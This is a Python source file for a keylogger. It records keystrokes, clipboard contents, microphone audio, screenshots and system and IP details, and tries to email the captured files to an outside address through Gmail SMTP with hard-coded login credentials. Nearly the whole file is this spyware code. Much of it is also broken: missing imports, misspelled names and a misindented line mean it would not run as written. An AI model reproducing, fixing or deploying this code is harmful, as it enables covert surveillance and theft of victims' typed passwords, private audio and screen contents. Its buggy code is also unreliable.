#An python based Keylogger which can send mails, get computer information, screenshots and clipboard,
# and also record microphone 
#email.mime.multipart
#email.mime.txt email.mime.base
#from email import MIMEMultipart
#from email import MIMEText
#from email import MIMEBase
#from email import encodersgggg
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
#from PIL import  imageGrab



username = getpass.getuser()
systemInfo = "systeminfo.txt"
mail = "cy-csam2922@st.umat.edu.gh"
password = "Passcode"
toaddr = "edu@gmail.com"

keys_information = "log.txt"
file_path = "C:\\Users\\Administrator\\Documents\\python  program\\PythonKeyLogger"
extend = "\\"

clipboardInfo = 'clipboard.txt'

microphone_time = 30
audioInfo = "audio.wav"

screenshotInfo = "screenshot.png"
time_iteration = 30
um_of_iterations_end = 3




def send_email(filename,attachment,toaddr):
    fromaddr = mail
    msg = "MIMEMultipart"
    msg['From'] = fromaddr
    msg["To"] = toaddr  
    msg["Subject"] = "Log File"
    
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, "plain"))
    
    filename = filename 
    attachment = open("attachment", "rb")
    p = MIMEBase('application', 'octet-stream ')
    
    p.set_payload((attachment).read()) 
    encoders.encode_base64(p)
    
    p.add_header("Content-Disposition", "attachment; filename ts")
    msg.attach(p)
    
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    
    s.login(fromaddr,password)
    
    text_msg = msg.as_string()
    
    s.sendmail(fromaddr, toaddr, text_msg)
    S.quit()

send_email(keys_information, file_path + extend + keys_information,toaddr)
    

def computer_info():
    with open(file_path + extend + systemInfo, "a") as f:
        hostname = socket.gethostname()
        IPaddrr = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.apify.org").text
            f.write("Public IP Address is " + publicIP)
        
        except Exception:
            f.write("Couldn't get the public IP address ")
            
        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("The system is a " + platform.system + " " + platform.version() + '\n')
        f.write('PC is a ' + platform.machine() + "machine" + "\n")
        f.write("The Hostname is " + hostname + '\n')
        f.write("Private IP Address : " + IPaddrr + "\n")

computer_info()

  
def copy_clipboard():
    with open(file_path + extend + clipboardInfo, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            cp_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write("Clipboard data : \n" + cp_data)
        except:
            f.write("Clipboard information could not be copied")
            
copy_clipboard()


def microphone():
    Freq = 4430
    t_sec = microphone_time
    
    recording = sd.rec(int(t_secs + Freq), samplerate = Freq, channels = 2)
    ad.wait()
    
    write(file_path + extend + audioInfo, Freq, recording)
    
microphone()



def screenshot():
    img = ImageGrab.grab()
img.save(file_path + extend + screenshotInfo)
    
screenshot()

             
num_of_iterations = 0
currentTime = time.time()
Stoptime = time.time() + time_iteration

while num_of_iterations < num_of_iterations_end:

    count = 0
    keys = []

    def key_press(key):
        global keys, count, currentTime
        keys.append(key)
        count +=1
        
        currentTime = time.time()
        
        print(f"{key} pressed")
        if count >= 15:
            count = 0
            write_file(keys)
            keys = []
        
    def write_file(keys):
        with open("log.txt","a") as F:
            for key in keys:
                k = str(key).replace('"', " ")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find('Key') == -1:
                    f.write(k)
                    f.close()
                    

    def key_release(key):
        if key == key.esc:
            return False
        if currentTime > Stoptime:
            return False          

    with Listener(on_press=key_press, on_release=key_release) as listener:
        listener.join()
        
if currentTime > Stoptime:
    
    with open(file_path + extend + keys_information, "w") as f:
        f.write(" ")
    
    screenshot()
    send_email(screenshotInfo, file_path + extend + screenshotInfo, toaddr)
    
    copy_clipboard()
    num_of_iterations += 1
    
    currentTime =time.time
    Stoptime = time.time() + time_iteration

time.sleep(120)
    